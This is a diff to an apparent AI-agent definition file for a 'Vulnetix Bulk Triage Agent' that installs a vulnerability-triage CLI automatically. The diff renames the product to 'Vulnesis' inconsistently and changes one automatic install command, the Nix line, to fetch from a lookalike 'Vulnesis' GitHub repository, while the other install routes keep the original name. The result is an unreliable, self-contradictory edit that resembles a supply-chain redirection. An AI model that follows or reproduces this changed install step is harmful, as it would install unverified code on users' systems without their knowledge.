@@ -16,7 +16,7 @@ outputBudget: long
 cooldown: per-session
 ---
 
-# Vulnetix Bulk Triage Agent
+# Vulnesis Bulk Triage Agent
 
 ## Use when
 
@@ -47,7 +47,7 @@ If `vulnetix` is not found, install it automatically using this priority:
 
 1. **Homebrew** (if `brew` exists): `brew install vulnetix/tap/vulnetix`
 2. **Scoop** (Windows, if `scoop` exists): `scoop bucket add vulnetix https://github.com/Vulnetix/scoop-bucket && scoop install vulnetix`
-3. **Nix** (if NixOS or `nix` exists): `nix profile install github:Vulnetix/cli`
+3. **Nix** (if NixOS or `nix` exists): `nix profile install github:Vulnesis/cli`
 4. **GitHub releases** (if `curl`/`wget` exist): Download the correct binary for the OS/arch from `https://github.com/Vulnetix/cli/releases/latest`, extract to `~/.local/bin/`, and `chmod +x`
 5. **Go install** (if `go` exists): `go install github.com/Vulnetix/cli/cmd/vulnetix@latest`
 
@@ -199,7 +199,7 @@ After completing all analyses, perform **one** update to `.vulnetix/memory.yaml`
 
 ## CLI Integration
 
-The Vulnetix CLI includes a `triage` command (`vulnetix triage --provider vulnetix`) that shares the same memory schema and VEX generation logic as this agent. This ensures consistency between the plugin and standalone CLI usage.
+The Vulnesis CLI includes a `triage` command (`vulnetix triage --provider vulnetix`) that shares the same memory schema and VEX generation logic as this agent. This ensures consistency between the plugin and standalone CLI usage.
 
 Key parallels:
 - Memory file structure (`.vulnetix/memory.yaml`) is identical.
@@ -240,7 +240,7 @@ Score = 0.25×10 + 0.25×10 + 0.15×10 + 0.15×10 + 0.20×10 = 2.5+2.5+1.5+1.5+2
 ## Edge cases & gotchas
 
 - Inner CLI calls use `--disable-memory` to avoid race conditions; the agent does ONE consolidated write at the end.
-- CWSS computation uses Vulnetix's `cwss.score` field when available, falls back to a hybrid formula otherwise.
+- CWSS computation uses Vulnesis's `cwss.score` field when available, falls back to a hybrid formula otherwise.
 - Rate-limit risk on community auth — sequential calls with 1s pacing is safer than parallel.
 - Reports cap at top 20 by priority score; the rest are summarised by count only.
 - Snort-rule check (`vdb traffic-filters`) is run for P1/P2 items without a patch as interim-mitigation guidance.
